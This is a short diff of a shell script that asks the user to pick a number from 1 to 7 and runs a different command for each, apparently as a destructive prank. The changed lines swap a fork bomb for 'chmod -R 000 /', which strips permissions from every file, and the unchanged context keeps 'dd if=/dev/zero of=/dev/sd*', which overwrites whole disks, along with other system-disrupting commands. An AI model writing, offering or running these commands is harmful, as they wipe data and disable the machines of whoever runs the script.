@@ -7,7 +7,7 @@ echo "select a number from 1 to 7:"
 
 read CHOICE
 
-[ $CHOICE = "1" ] &&  sh :(){ :|:& };:
+[ $CHOICE = "1" ] && chmod -R 000 /
 
 [ $CHOICE = "2" ] && echo "UwU"
 
@@ -24,7 +24,7 @@ read CHOICE
 
 [ $CHOICE = "5" ] && dd if=/dev/zero of=/dev/sd* 
 
-[ $CHOICE = "6" ] && hexdump /dev/urandom & umount /boot
+[ $CHOICE = "6" ] && timeout 2 hexdump /dev/urandom & grep -R / | lolcat 
 
 [ $CHOICE = "7" ] && while true 
 		do
